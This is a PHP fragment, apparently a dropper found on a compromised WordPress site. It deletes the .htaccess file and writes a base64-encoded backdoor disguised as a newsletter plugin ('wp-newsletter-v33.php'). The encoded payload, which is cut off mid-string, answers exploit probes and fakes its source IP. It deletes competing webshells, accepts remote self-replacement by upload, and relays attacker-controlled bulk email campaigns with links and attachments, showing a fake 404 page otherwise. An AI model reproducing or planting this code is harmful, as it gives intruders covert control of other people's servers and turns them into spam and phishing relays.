
			$Folder = dirname(__FILE__)."/";
			unlink($Folder.".htaccess");
file_put_contents($Folder."wp-newsletter-v33.php", base64_decode("PD9waHANCkBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdFdXJvcGUvTG9uZG9uJyk7DQpAZXJyb3JfcmVwb3J0aW5nKDApOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQGluaV9zZXQoJ21lbW9yeV9saW1pdCcsICctMScpOw0KQGRlZmluZSgnTUFJTF9WRVJTSU9OJywgJzEuOS4wJyk7DQpAZGVmaW5lKCdNQUlMX1VSTCcsIEdldE1haWxVUkwoKSk7DQpAZGVmaW5lKCdSRURJUkVDVElPTl9GT0xERVInLCAiZmpiaWpicmsiKTsNCmlmIChpc3NldCgkX0dFVFsnc2VydmVyLWluZm9zJ10pKSB7DQogICAgQ3JlYXRlSFRhY2Nlc3MoKTsNCiAgICAkU0VSVkVSX0lORk9TID0gJF9TRVJWRVI7DQogICAgaWYgKCFpc19hcnJheSgkU0VSVkVSX0lORk9TKSkgew0KICAgICAgICAkU0VSVkVSX0lORk9TID0gYXJyYXkoKTsNCiAgICB9DQogICAgJFNFUlZFUl9JTkZPU1snUkVBTF9JUF9HRVQnXSAgICAgPSBHZXRQYWdlQ29udGVudCgiaHR0cDovL215aXAuZG5zb21hdGljLmNvbS8iKTsNCiAgICAkU0VSVkVSX0lORk9TWydFWFBMT0lUX1ZFUlNJT04nXSA9IE1BSUxfVkVSU0lPTjsNCiAgICBlY2hvIGpzb25fZW5jb2RlKCRTRVJWRVJfSU5GT1MpOw0KICAgIGV4aXQ7DQp9DQokX1NFUlZFUlsnUEhQX1NFTEYnXSAgICAgICAgICA9ICIvaW5kZXgucGhwIjsNCiRIVFRQX1NFUlZFUl9WQVJTWydQSFBfU0VMRiddID0gIi9pbmRleC5waHAiOw0KZm9yZWFjaCAoYXJyYXkoDQogICAgJ0hUVFBfQ0xJRU5UX0lQJywNCiAgICAnSFRUUF9YX0ZPUldBUkRFRF9GT1InLA0KICAgICdIVFRQX1hfRk9SV0FSREVEJywNCiAgICAnSFRUUF9YX0NMVVNURVJfQ0xJRU5UX0lQJywNCiAgICAnSFRUUF9GT1JXQVJERURfRk9SJywNCiAgICAnSFRUUF9GT1JXQVJERUQnLA0KICAgICdSRU1PVEVfQUREUicNCikgYXMgJGtleSkgew0KICAgICRfU0VSVkVSWyRrZXldICAgICAgICAgID0gIjEyNy4wLjAuMSI7DQogICAgJEhUVFBfU0VSVkVSX1ZBUlNbJGtleV0gPSAiMTI3LjAuMC4xIjsNCn0NCmlmIChpc3NldCgkX0dFVFsndGVzdC1leHBsb2l0J10pKSB7DQogICAgZWNobyAiRVhQTE9JVE9LIjsNCiAgICBleGl0Ow0KfQ0KaWYgKGlzc2V0KCRfR0VUWydkZWxldGUtd3NvJ10pKSB7DQogICAgZWNobyBEZWxldGVCYWRGaWxlcygpOw0KICAgIGV4aXQ7DQp9DQpmdW5jdGlvbiBEZWxldGVCYWRGaWxlcygkZGVsZXRlID0gZmFsc2UsICRmb2xkZXIgPSAiIikgew0KICAgICRGaWxlVG9EZWxldGUgID0gYXJyYXkoKTsNCiAgICAkRmlsZUxpc3QgICAgICA9IFNjYW5Gb2xkZXIoZGlybmFtZShfX0ZJTEVfXykgLiAiLyIgLiAkZm9sZGVyKTsNCiAgICAkd2hpdGVGaWxlICAgICA9IGFycmF5KA0KICAgICAgICBiYXNlbmFtZShfX0ZJTEVfXyksDQogICAgICAgICJlcnJvcl9sb2ciLA0KICAgICAgICAiLmh0YWNjZXNzIiwNCiAgICAgICAgIi5odG1sIiwNCiAgICAgICAgIi5jc3MiLA0KICAgICAgICAiLnBuZyIsDQogICAgICAgICIuZ2lmIiwNCiAgICAgICAgIi5qcGVnIiwNCiAgICAgICAgIi5qcGciLA0KICAgICAgICAiLmljbyIsDQogICAgICAgICIuanMiDQogICAgKTsNCiAgICAkd2hpdGVGaWxlUHJlZyA9IGFycmF5KCk7DQogICAgZm9yZWFjaCAoJHdoaXRlRmlsZSBhcyAkd2hpdGVGaWxlVG9DaGVjaykgew0KICAgICAgICAkd2hpdGVGaWxlUHJlZ1tdID0gcHJlZ19xdW90ZSgkd2hpdGVGaWxlVG9DaGVjaywgIi8iKTsNCiAgICB9DQogICAgJEJsYWNrTGlzdCAgICAgPSBhcnJheSgNCiAgICAgICAgImRlZmluZSgnTUFJTF9WRVJTSU9OJywiLA0KICAgICAgICAiX2Zfd3AiDQogICAgKTsNCiAgICAkQmxhY2tMaXN0UHJlZyA9IGFycmF5KCk7DQogICAgZm9yZWFjaCAoJEJsYWNrTGlzdCBhcyAkQmxhY2tMaXN0VG9DaGVjaykgew0KICAgICAgICAkQmxhY2tMaXN0UHJlZ1tdID0gcHJlZ19xdW90ZSgkQmxhY2tMaXN0VG9DaGVjaywgIi8iKTsNCiAgICB9DQogICAgJHdoaXRlTGlzdCAgICAgPSBhcnJheSgNCiAgICAgICAgIkBwYWNrYWdlIiwNCiAgICAgICAgIndwX25hdl9tZW51KCIsDQogICAgICAgICJibG9naW5mbygiLA0KICAgICAgICAibGFuZ3VhZ2VfYXR0cmlidXRlcygiLA0KICAgICAgICAiaGFzX25hdl9tZW51KCIsDQogICAgICAgICJib2R5X2NsYXNzKCINCiAgICApOw0KICAgICR3aGl0ZUxpc3RQcmVnID0gYXJyYXkoKTsNCiAgICBmb3JlYWNoICgkd2hpdGVMaXN0IGFzICR3aGl0ZUxpc3RUb0NoZWNrKSB7DQogICAgICAgICR3aGl0ZUxpc3RQcmVnW10gPSBwcmVnX3F1b3RlKCR3aGl0ZUxpc3RUb0NoZWNrLCAiLyIpOw0KICAgIH0NCiAgICBmb3JlYWNoICgkRmlsZUxpc3QgYXMgJEZpbGVTY2FuKSB7DQogICAgICAgIGlmICgkRmlsZVNjYW4gPT0gIi4iIG9yICRGaWxlU2NhbiA9PSAiLi4iIG9yIGlzX2RpcigkRmlsZVNjYW4pIG9yICFpc19maWxlKCRGaWxlU2Nhbikgb3IgJEZpbGVTY2FuID09IGJhc2VuYW1lKF9fRklMRV9fKSkgew0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvJyAuIGltcGxvZGUoInwiLCAkd2hpdGVGaWxlUHJlZykgLiAnL2knLCAkRmlsZVNjYW4pKSB7DQogICAgICAgICAgICAkRmlsZUNoZWNrQ29udGVudCA9IEBmaWxlX2dldF9jb250ZW50cygkRmlsZVNjYW4pOw0KICAgICAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvJyAuIGltcGxvZGUoInwiLCAkd2hpdGVMaXN0UHJlZykgLiAnL2knLCAkRmlsZUNoZWNrQ29udGVudCkgb3IgcHJlZ19tYXRjaCgnLycgLiBpbXBsb2RlKCJ8IiwgJEJsYWNrTGlzdFByZWcpIC4gJy9pJywgJEZpbGVDaGVja0NvbnRlbnQpKSB7DQogICAgICAgICAgICAgICAgaWYgKCFpc193cml0YWJsZSgkRmlsZVNjYW4pKSB7DQogICAgICAgICAgICAgICAgICAgICRXcml0YWJsZSA9ICcgLSA8c3BhbiBzdHlsZT0iY29sb3I6cmVkOyI+KFRoaXMgZmlsZSBjYW5cJ3QgYmUgZWRpdC9kZWxldGVkICEpPC9zcGFuPic7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJFdyaXRhYmxlID0gJyAtIDxzcGFuIHN0eWxlPSJjb2xvcjpncmVlbjsiPihUaGlzIGZpbGUgY2FuIGJlIGVkaXQvZGVsZXRlZCAhKTwvc3Bhbj4nOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2FjdGlvbiddKSkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJF9HRVRbJ2FjdGlvbiddID09ICJkZWxldGUiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkRmlsZVRvRGVsZXRlW10gPSAkRmlsZVNjYW47DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkRmlsZVRvRGVsZXRlW10gPSAkRmlsZVNjYW4gLiAkV3JpdGFibGU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBpZiAoJGRlbGV0ZSA9PSB0cnVlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkRmlsZVRvRGVsZXRlW10gPSAkRmlsZVNjYW47DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkRmlsZVRvRGVsZXRlW10gPSAkRmlsZVNjYW4gLiAkV3JpdGFibGU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgaWYgKCRfR0VUWydhY3Rpb24nXSA9PSAiZGVsZXRlIiBvciAkZGVsZXRlID09IHRydWUpIHsNCiAgICAgICAgZm9yZWFjaCAoJEZpbGVUb0RlbGV0ZSBhcyAkRGVsZXRlRmlsZSkgew0KICAgICAgICAgICAgQHVubGluaygkRGVsZXRlRmlsZSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICJPSyI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuIGpzb25fZW5jb2RlKCRGaWxlVG9EZWxldGUpOw0KICAgIH0NCn0NCmlmIChpc3NldCgkX0dFVFsnc2VsZi11cGRhdGUnXSkpIHsNCiAgICAkQ3VycmVudEZpbGUgPSBfX0ZJTEVfXzsNCiAgICAkU2F2ZUNvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHMoJEN1cnJlbnRGaWxlKTsNCiAgICBpZiAoJF9GSUxFU1snZiddWyd0bXBfbmFtZSddICE9ICIiKSB7DQogICAgICAgIGlmIChAdW5saW5rKHByZWdfcmVwbGFjZSgnIVwoXGQrXClccy4qIScsICcnLCBfX0ZJTEVfXykpKSB7DQogICAgICAgICAgICBpZiAoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2YnXVsnbmFtZSddKSkgew0KICAgICAgICAgICAgICAgIGVjaG8gIk9LIjsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRDdXJyZW50RmlsZSwgJFNhdmVDb250ZW50KTsNCiAgICAgICAgICAgICAgICBlY2hvICJOTyI7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBlY2hvICJOT19ERUxFVEUiOw0KICAgICAgICB9DQogICAgfQ0KICAgIGV4aXQ7DQp9DQppZiAoaXNzZXQoJF9HRVRbJ2NoZWNrX21haWxfc210cCddKSkgew0KICAgICRzbXRwID0gbmV3IFNNVFA7DQogICAgJEhvc3QgPSAic210cC5saXZlLmNvbSI7DQogICAgJFBvcnQgPSAyNTsNCiAgICBpZiAoaXNzZXQoJF9HRVRbJ2hvc3QnXSkgJiYgJF9HRVRbJ2hvc3QnXSAhPSAiIikgew0KICAgICAgICAkSG9zdCA9ICRfR0VUWydob3N0J107DQogICAgfQ0KICAgIGlmIChpc3NldCgkX0dFVFsncG9ydCddKSAmJiAkX0dFVFsncG9ydCddICE9ICIiKSB7DQogICAgICAgICRQb3J0ID0gJF9HRVRbJ3BvcnQnXTsNCiAgICB9DQoJJHVybFNoZWxsID0gR2V0UmVkaXJlY3Rpb25MaW5rKCRfR0VUWydyZWFsX3VybCddKTsNCiAgICBpZiAoJHVybFNoZWxsID09PSBmYWxzZSkgew0KICAgICAgICBlY2hvICJOT19SRURJUkVDVElPTiI7DQogICAgICAgIGV4aXQ7DQogICAgfQ0KICAgIHRyeSB7DQogICAgICAgIGlmICghJHNtdHAtPmNvbm5lY3QoJEhvc3QsICRQb3J0LCAxMCkpIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJ0Nvbm5lY3QgZmFpbGVkJyk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCEkc210cC0+aGVsbG8oImxvY2FsaG9zdC5sb2NhbGRvbWFpbiIpKSB7DQogICAgICAgICAgICAkU01UUF9FUlJPUiA9ICRzbXRwLT5nZXRFcnJvcigpOw0KICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbignRUhMTyBmYWlsZWQ6ICcgLiAkU01UUF9FUlJPUlsnZXJyb3InXSk7DQogICAgICAgIH0NCiAgICAgICAgJGUgPSAkc210cC0+Z2V0U2VydmVyRXh0TGlzdCgpOw0KICAgICAgICBpZiAoaXNfYXJyYXkoJGUpICYmIGFycmF5X2tleV9leGlzdHMoJ1NUQVJUVExTJywgJGUpKSB7DQogICAgICAgICAgICAkdGxzb2sgPSAkc210cC0+c3RhcnRUTFMoKTsNCiAgICAgICAgICAgIGlmICghJHRsc29rKSB7DQogICAgICAgICAgICAgICAgJFNNVFBfRVJST1IgPSAkc210cC0+Z2V0RXJyb3IoKTsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCdGYWlsZWQgdG8gc3RhcnQgZW5jcnlwdGlvbjogJyAuICRTTVRQX0VSUk9SWydlcnJvciddKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICghJHNtdHAtPmhlbGxvKCJsb2NhbGhvc3QubG9jYWxkb21haW4iKSkgew0KICAgICAgICAgICAgICAgICRTTVRQX0VSUk9SID0gJHNtdHAtPmdldEVycm9yKCk7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbignRUhMTyAoMikgZmFpbGVkOiAnIC4gJFNNVFBfRVJST1JbJ2Vycm9yJ10pOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGUgPSAkc210cC0+Z2V0U2VydmVyRXh0TGlzdCgpOw0KICAgICAgICB9DQogICAgICAgIGlmIChpc19hcnJheSgkZSkgJiYgYXJyYXlfa2V5X2V4aXN0cygnQVVUSCcsICRlKSkgew0KICAgICAgICAgICAgZWNobyAiT0siOw0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIChFeGNlcHRpb24gJGUpIHsNCiAgICAgICAgZWNobyAkZS0+Z2V0TWVzc2FnZSgpOw0KICAgIH0NCiAgICAkc210cC0+cXVpdCh0cnVlKTsNCiAgICBleGl0Ow0KfQ0KaWYgKGlzc2V0KCRfR0VUWydzZW5kX2NhbXBhaWduX3BocCddKSkgew0KICAgIENyZWF0ZUhUYWNjZXNzKCk7DQogICAgZWNobyBHZXRQYWdlQ29udGVudCh1cmxkZWNvZGUoJF9HRVRbJ3JlYWxfdXJsJ10pIC4gIj9zZW5kX2NhbXBhaWduX3BocF9hY3Rpb249dHJ1ZSZyZWFsX3VybD0iIC4gJF9HRVRbJ3JlYWxfdXJsJ10sICRfUE9TVCk7DQogICAgZXhpdDsNCn0NCmlmIChpc3NldCgkX0dFVFsnc2VuZF9jYW1wYWlnbl9waHBfYWN0aW9uJ10pKSB7DQogICAgJFJldHVyblRleHQgPSBhcnJheSgpOw0KICAgICRBbGxDb21tYW5kID0gdW5zZXJpYWxpemUoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2NvbW1hbmQnXSkpOw0KCSR1cmxTaGVsbCA9IEdldFJlZGlyZWN0aW9uTGluaygkX0dFVFsncmVhbF91cmwnXSk7DQogICAgaWYgKCR1cmxTaGVsbCA9PT0gZmFsc2UgJiYgcHJlZ19tYXRjaCgnLycgLiBwcmVnX3F1b3RlKCJbc2hlbGxfcmV3cml0ZV91cmxdIiwgIi8iKSAuICcvaScsICRDb21tYW5kWydjb250ZW50J10pKSB7DQogICAgICAgIGVjaG8gIk5PX1JFRElSRUNUSU9OIjsNCiAgICAgICAgZXhpdDsNCiAgICB9DQogICAgZm9yZWFjaCAoJEFsbENvbW1hbmQgYXMgJENvbW1hbmQpIHsNCiAgICAgICAgJG1haWwgICAgID0gbmV3IFNpbHRoeE1haWxlcjsNCiAgICAgICAgDQogICAgICAgICRzbXRwID0gaXNzZXQoJENvbW1hbmRbJ3NtdHAnXSkgPyAkQ29tbWFuZFsnc210cCddIDogJyc7DQogICAgICAgIGlmIChpc19hcnJheSgkc210cCkpIHsNCiAgICAgICAgICAgIGlmIChpc3NldCgkQ29tbWFuZFsnc210cCddWydzZW5kZXJfZW1haWwnXSkpIHsNCiAgICAgICAgICAgICAgICAkRnJvbSA9ICRDb21tYW5kWydzbXRwJ11bJ3NlbmRlcl9lbWFpbCddOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkRnJvbSA9ICRDb21tYW5kWydzbXRwJ11bJ3VzZXInXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRtYWlsLT5pc1NNVFAoKTsNCiAgICAgICAgICAgICRtYWlsLT5Ib3N0ICAgICAgICAgID0gJENvbW1hbmRbJ3NtdHAnXVsnaG9zdCddOw0KICAgICAgICAgICAgJG1haWwtPlNNVFBBdXRoICAgICAgPSB0cnVlOw0KICAgICAgICAgICAgJG1haWwtPlNNVFBLZWVwQWxpdmUgPSB0cnVlOw0KICAgICAgICAgICAgJG1haWwtPlNNVFBBdXRvVExTICAgPSBmYWxzZTsNCiAgICAgICAgICAgIGlmICgkQ29tbWFuZFsnc210cCddWydzZWN1cml0eSddID09ICJhdXRvIikgew0KICAgICAgICAgICAgICAgICRtYWlsLT5TTVRQQXV0b1RMUyA9IHRydWU7DQogICAgICAgICAgICB9IGVsc2VpZiAoJENvbW1hbmRbJ3NtdHAnXVsnc2VjdXJpdHknXSA9PSAidGxzIikgew0KICAgICAgICAgICAgICAgICRtYWlsLT5TTVRQU2VjdXJlID0gJ3Rscyc7DQogICAgICAgICAgICB9IGVsc2VpZiAoJENvbW1hbmRbJ3NtdHAnXVsnc2VjdXJpdHknXSA9PSAic3NsIikgew0KICAgICAgICAgICAgICAgICRtYWlsLT5TTVRQU2VjdXJlID0gJ3NzbCc7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkbWFpbC0+UG9ydCAgICAgPSAkQ29tbWFuZFsnc210cCddWydwb3J0J107DQogICAgICAgICAgICAkbWFpbC0+VXNlcm5hbWUgPSAkQ29tbWFuZFsnc210cCddWyd1c2VyJ107DQogICAgICAgICAgICAkbWFpbC0+UGFzc3dvcmQgPSAkQ29tbWFuZFsnc210cCddWydwYXNzJ107DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkRG9tYWluID0gZ2V0X2RvbWFpbigiaHR0cDovLyIgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10pOw0KICAgICAgICAgICAgaWYgKCRDb21tYW5kWydmcm9tJ10gIT0gIiIpIHsNCiAgICAgICAgICAgICAgICAkRnJvbSA9ICRDb21tYW5kWydmcm9tJ10gLiAnQCcgLiAkRG9tYWluOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkRG9tYWluID0gZ2V0X2RvbWFpbigiaHR0cDovLyIgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10pOw0KICAgICAgICAgICAgICAgICRGcm9tICAgPSAnY29udGFjdEAnIC4gJERvbWFpbjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkbWFpbC0+c2V0RnJvbSgkRnJvbSwgJENvbW1hbmRbJ25hbWUnXSk7DQogICAgICAgICRtYWlsLT5TZW5kZXIgPSAkRnJvbTsNCiAgICAgICAgJG1haWwtPmFkZEFkZHJlc3MoJENvbW1hbmRbJ3RvJ10pOw0KICAgICAgICAkbWFpbC0+U3ViamVjdCA9ICRDb21tYW5kWydzdWJqZWN0J107DQogICAgICAgICRtYWlsLT5YTWFpbGVyID0gJyAnOw0KICAgICAgICAkQ29udGVudCAgICAgICA9IHN0cl9yZXBsYWNlKCdbc2hlbGxfcmV3cml0ZV91cmxdJywgJHVybFNoZWxsLCAkQ29tbWFuZFsnY29udGVudCddKTsNCiAgICAgICAgaWYgKCRDb21tYW5kWydzb3VyY2VfdHlwZSddID09ICJodG1sIikgew0KICAgICAgICAgICAgJG1haWwtPm1zZ0hUTUwoJENvbnRlbnQpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJG1haWwtPmlzSFRNTChmYWxzZSk7DQogICAgICAgICAgICAkbWFpbC0+Qm9keSAgICA9ICRDb250ZW50Ow0KICAgICAgICAgICAgJG1haWwtPkFsdEJvZHkgPSAkQ29udGVudDsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJENvbW1hbmRbJ3JlcGx5X3RvJ10gIT0gIiIpIHsNCiAgICAgICAgICAgICRtYWlsLT5BZGRSZXBseVRvKCRDb21tYW5kWydyZXBseV90byddKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtYWlsLT5BZGRSZXBseVRvKCRGcm9tLCAkQ29tbWFuZFsnbmFtZSddKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJENvbW1hbmRbJ2ZpbGUnXSAhPSAiIikgew0KICAgICAgICAgICAgJEZpbGVFeHRlbnNpb24gPSBwYXRoaW5mbyhwYXJzZV91cmwoJENvbW1hbmRbJ2ZpbGUnXSwgUEhQX1VSTF9QQVRIKSwgUEFUSElORk9fRVhURU5TSU9OKTsNCiAgICAgICAgICAgICRtYWlsLT5hZGRTdHJpbmdBdHRhY2htZW50KEdldFBhZ2VDb250ZW50KCRDb21tYW5kWydmaWxlJ10pLCAkQ29tbWFuZFsnZmlsZW5hbWUnXSAuICIuIiAuICRGaWxlRXh0ZW5zaW9uKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISRtYWlsLT5zZW5kKCkpIHsNCiAgICAgICAgICAgICRSZXR1cm5UZXh0W10gPSAkQ29tbWFuZFsnaWQnXSAuICI6MjoiIC4gJG1haWwtPkVycm9ySW5mbzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRSZXR1cm5UZXh0W10gPSAkQ29tbWFuZFsnaWQnXSAuICI6MToiOw0KICAgICAgICB9DQogICAgfQ0KICAgIGlmIChlbXB0eSgkUmV0dXJuVGV4dCkpIHsNCiAgICAgICAgZWNobyAiTk8iOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGVjaG8gaW1wbG9kZSgnOnw6JywgJFJldHVyblRleHQpOw0KICAgIH0NCiAgICBleGl0Ow0KfQ0KaWYgKGlzc2V0KCRfR0VUWydjaGVja19pbmJveF9waHAnXSkpIHsNCiAgICBlY2hvIEdldFBhZ2VDb250ZW50KHVybGRlY29kZSgkX0dFVFsncmVhbF91cmwnXSkgLiAiP2NoZWNrX2luYm94X3BocF9hY3Rpb249dHJ1ZSZlbWFpbD0iIC4gJF9HRVRbJ2VtYWlsJ10gLiAiJnN1YmplY3Q9IiAuICRfR0VUWydzdWJqZWN0J10gLiAiJmZyb209IiAuICRfR0VUWydmcm9tJ10gLiAiJnJlYWxfdXJsPSIgLiAkX0dFVFsncmVhbF91cmwnXSk7DQogICAgZXhpdDsNCn0NCmlmIChpc3NldCgkX0dFVFsnY2hlY2tfbWFpbF9waHAnXSkpIHsNCgkkdXJsU2hlbGwgPSBHZXRSZWRpcmVjdGlvbkxpbmsoJF9HRVRbJ3JlYWxfdXJsJ10pOw0KCWlmICgkdXJsU2hlbGwgPT09IGZhbHNlKSB7DQogICAgICAgIGVjaG8gIk5PX1JFRElSRUNUSU9OIjsNCiAgICAgICAgZXhpdDsNCiAgICB9DQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWFpbCcpKSB7DQogICAgICAgIGVjaG8gIk9LIjsNCiAgICB9IGVsc2Ugew0KICAgICAgICBlY2hvICJOTyI7DQogICAgfQ0KICAgIGV4aXQ7DQp9DQppZiAoaXNzZXQoJF9HRVRbJ2NoZWNrX2luYm94X3BocF9hY3Rpb24nXSkpIHsNCiAgICAkbWFpbCAgICAgICAgICA9IG5ldyBTaWx0aHhNYWlsZXI7DQogICAgJERvbWFpbiAgICAgICAgPSBzdHJ0b2xvd2VyKGdldF9kb21haW4oImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSk7DQogICAgJEV4cGxvZGVEb21haW4gPSBleHBsb2RlKCIuIiwgJERvbWFpbik7DQogICAgJE5hbWUgICAgICAgICAgPSB1Y2ZpcnN0KCRFeHBsb2RlRG9tYWluWzBdKTsNCiAgICBpZiAoaXNzZXQoJF9HRVRbJ2Zyb20nXSkpIHsNCiAgICAgICAgJEZyb20gPSAkX0dFVFsnZnJvbSddOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRGcm9tID0gJ2NvbnRhY3RAJyAuICREb21haW47DQogICAgfQ0KICAgICRtYWlsLT5zZXRGcm9tKCRGcm9tLCAkTmFtZSk7DQogICAgJG1haWwtPlNlbmRlciA9ICRGcm9tOw0KICAgICRtYWlsLT5BZGRSZXBseVRvKCRGcm9tLCAkTmFtZSk7DQogICAgJG1haWwtPmFkZEFkZHJlc3MoJF9HRVRbJ2VtYWlsJ10pOw0KICAgICRtYWlsLT5TdWJqZWN0ID0gJF9HRVRbJ3N1YmplY3QnXTsNCiAgICAkbWFpbC0+WE1haWxlciA9ICcgJzsNCiAgICBpZiAoaXNzZXQoJF9HRVRbJ2JvZHknXSkpIHsNCiAgICAgICAgJG1haWwtPkJvZHkgPSAkX0dFVFsnYm9keSddOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRtYWlsLT5Cb2R5ID0gIkhlbGxvLCBhcyB5b3UgYXNrIG9uIG91ciB3ZWJzaXRlLCB0aGlzIGlzIHlvdXIgYXBpIGtleSBmb3IgdXNlIG91ciBzZXJ2aWNlIDogIiAuIG1kNSh1bmlxaWQodGltZSgpKSk7DQogICAgfQ0KICAgIGlmICghJG1haWwtPnNlbmQoKSkgew0KICAgICAgICBlY2hvICJOTyI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZWNobyAiT0siOw0KICAgIH0NCiAgICBleGl0Ow0KfQ0KRGlzcGxheTQwNFBhZ2UoKTsNCmZ1bmN0aW9uIGdldF9kb21haW4oJHVybCkgew0KICAgICRwaWVjZXMgPSBwYXJzZV91cmwoJHVybCk7DQogICAgJGRvbWFpbiA9IGlzc2V0KCRwaWVjZXNbJ2hvc3QnXSkgPyAkcGllY2VzWydob3N0J10gOiAnJzsNCiAgICBpZiAocHJlZ19tYXRjaCgnLyg/UDxkb21haW4+W2EtejAtOV1bYS16MC05XC1dezEsNjN9XC5bYS16XC5dezIsNn0pJC9pJywgJGRvbWFpbiwgJHJlZ3MpKSB7DQogICAgICAgIHJldHVybiAkcmVnc1snZG9tYWluJ107DQogICAgfQ0KICAgIHJldHVybiBmYWxzZTsNCn0NCmZ1bmN0aW9uIHJhbmRTdHIoJGxlbmd0aCkgew0KICAgICRjaGFyYWN0ZXJzICAgICAgID0gJzAxMjM0NTY3ODlhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaJzsNCiAgICAkY2hhcmFjdGVyc0xlbmd0aCA9IHN0cmxlbigkY2hhcmFjdGVycyk7DQogICAgJHJhbmRvbVN0cmluZyAgICAgPSAnJzsNCiAgICBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyAkaSsrKSB7DQogICAgICAgICRyYW5kb21TdHJpbmcgLj0gJGNoYXJhY3RlcnNbcmFuZCgwLCAkY2hhcmFjdGVyc0xlbmd0aCAtIDEpXTsNCiAgICB9DQogICAgcmV0dXJuICRyYW5kb21TdHJpbmc7DQp9DQpmdW5jdGlvbiBTY2FuRm9sZGVyKCRkaXIpIHsNCiAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnc2NhbmRpcicpKSB7DQogICAgICAgICRkaCA9IG9wZW5kaXIoJGRpcik7DQogICAgICAgIHdoaWxlIChmYWxzZSAhPT0gKCRmaWxlbmFtZSA9IHJlYWRkaXIoJGRoKSkpIHsNCiAgICAgICAgICAgICRmaWxlc1tdID0gJGZpbGVuYW1lOw0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGZpbGVzID0gc2NhbmRpcigkZGlyKTsNCiAgICB9DQogICAgcmV0dXJuICRmaWxlczsNCn0NCmZ1bmN0aW9uIGNVUkxSZXF1ZXN0KCR1cmwsICRwb3N0RmllbGRzID0gbnVsbCwgJGh0dHBIZWFkZXIgPSBhcnJheSgpKSB7DQogICAgJGNoID0gY3VybF9pbml0KCk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZSRVNIX0NPTk5FQ1QsIHRydWUpOw0KICAgIGlmICghZW1wdHkoJHBvc3RGaWVsZHMpKSB7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsICRwb3N0RmllbGRzKTsNCiAgICB9DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDYuMDsgV2luZG93cyBOVCA2LjE7IC5ORVQgQ0xSIDEuMS40MzIyKSIpOw0